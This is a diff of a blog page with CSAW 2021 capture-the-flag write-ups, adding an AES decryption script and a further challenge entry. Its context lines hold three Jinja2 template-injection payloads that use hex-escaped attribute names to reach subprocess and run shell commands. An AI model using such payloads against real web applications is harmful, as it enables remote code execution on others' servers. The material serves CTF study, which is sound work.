@@ -56,13 +56,28 @@ Ninja🥷ssti-&amp;gt;payload
 
         </div>
         <div class="content markdown">
-            <p><img src="/2021/10/30/csaw2021/image-20211030195537198.png" alt="image-20211030195537198"></p>
+            <p><img src="/CSAW2021.assets/image-20211030195537198.png" alt="image-20211030195537198"></p>
 <h1 id="Ninja🥷"><a href="#Ninja🥷" class="headerlink" title="Ninja🥷"></a>Ninja🥷</h1><p>ssti-&gt;payload</p>
 <pre><code>{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5f'+'b'+'ase\x5f\x5f')|attr('x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(258)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()}}</code></pre>
 <pre><code>{{''[request.args.a][request.args.b][2][request.args.c]()[258]('cat+flag.txt',shell%3dTrue,stdout%3d-1).communicate()[0].strip()}}&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__</code></pre>
 <pre><code>{{()|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5f\x62\x61\x73\x65\x5f\x5f%27)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(258)(%27cat+flag.txt%27,shell=True,stdout=-1)|attr(%27communicate%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(0)|attr(%27decode%27)(%27utf-8%27)}}</code></pre>
 <p>flag{m0mmy_s33_1m_4_r34l_n1nj4}</p>
-<h1 id="Gatekeeping"><a href="#Gatekeeping" class="headerlink" title="Gatekeeping"></a>Gatekeeping</h1>
+<h1 id="Gatekeeping"><a href="#Gatekeeping" class="headerlink" title="Gatekeeping"></a>Gatekeeping</h1><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
+<span class="token keyword">import</span> binascii
+
+<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'dist/flag.txt.enc'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    key <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token string">'b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3'</span><span class="token punctuation">)</span>
+    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    iv <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">]</span>
+
+    data <span class="token operator">=</span> data<span class="token punctuation">[</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">:</span><span class="token punctuation">]</span>
+    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>flag{gunicorn_probably_should_not_do_that}</p>
+<h1 id="No-pass-needed"><a href="#No-pass-needed" class="headerlink" title="No-pass-needed"></a>No-pass-needed</h1><p><img src="/CSAW2021.assets/image-20211031152446651.png" alt="image-20211031152446651"></p>
+<p>flag{wh0_n3ed5_a_p4ssw0rd_anyw4y}</p>
+
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                 <source type="audio/mpeg" src="">
@@ -93,7 +108,7 @@ Ninja🥷ssti-&amp;gt;payload
     </div>
     
         <div class='side'>
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ninja%F0%9F%A5%B7"><span class="toc-number">1.</span> <span class="toc-text">Ninja🥷</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gatekeeping"><span class="toc-number">2.</span> <span class="toc-text">Gatekeeping</span></a></li></ol>	
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ninja%F0%9F%A5%B7"><span class="toc-number">1.</span> <span class="toc-text">Ninja🥷</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gatekeeping"><span class="toc-number">2.</span> <span class="toc-text">Gatekeeping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#No-pass-needed"><span class="toc-number">3.</span> <span class="toc-text">No-pass-needed</span></a></li></ol>	
         </div>
     
 </div>
